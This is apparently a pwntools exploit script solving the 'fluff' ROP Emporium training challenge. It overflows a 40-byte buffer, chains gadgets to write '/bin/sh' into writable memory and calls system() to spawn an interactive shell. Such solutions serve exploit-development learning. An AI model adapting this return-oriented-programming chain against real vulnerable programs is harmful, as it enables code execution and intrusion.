from pwn import *
import struct

# Setup the binary
elf = ELF("./fluff")
p = elf.process()

# Addresses
xor_r11 = 0x400822
pop_r12 = 0x400832
writable = 0x601000
xor_r11_r12 = 0x40082f
xchg_r11_r10 = 0x400840
inject_str = "/bin/sh\x00"
major_rop = 0x40084e # mov QWORD PTR [r10],r11 ; pop r13 ; pop r12 ; xor BYTE PTR [r10], r12b ; ret ; -> writing to memeory
system = 0x4005e0
pop_rdi_ret = 0x4008c3
junk = 0x1

# Payload
buf = ""
buf += "A" * 40
# Move Address to r10
buf += struct.pack("<Q", xor_r11)	# xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret ;
buf += struct.pack("<Q", junk)
buf += struct.pack("<Q", pop_r12)	# pop r12, mov r13d, 0x604060 ; ret;
buf += struct.pack("<Q", writable)
buf += struct.pack("<Q", xor_r11_r12)	# xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret ;
buf += struct.pack("<Q", junk)
buf += struct.pack("<Q", xchg_r11_r10)	# xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret ;
buf += struct.pack("<Q", junk)
# Move /bin/sh to r11 
buf += struct.pack("<Q", xor_r11)
buf += struct.pack("<Q", junk)
buf += struct.pack("<Q", pop_r12)
buf += inject_str
buf += struct.pack("<Q", xor_r11_r12)
buf += struct.pack("<Q", junk)
# Write the string to address pointed by r10
buf += struct.pack("<Q", major_rop)
buf += struct.pack("<Q", junk)
buf += struct.pack("<Q", 0x0)
# Call system
buf += struct.pack("<Q", pop_rdi_ret)
buf += struct.pack("<Q", writable)
buf += struct.pack("<Q", system)

#print buf

# Send payload
p.recvuntil("> ")
p.send(buf)

p.interactive()
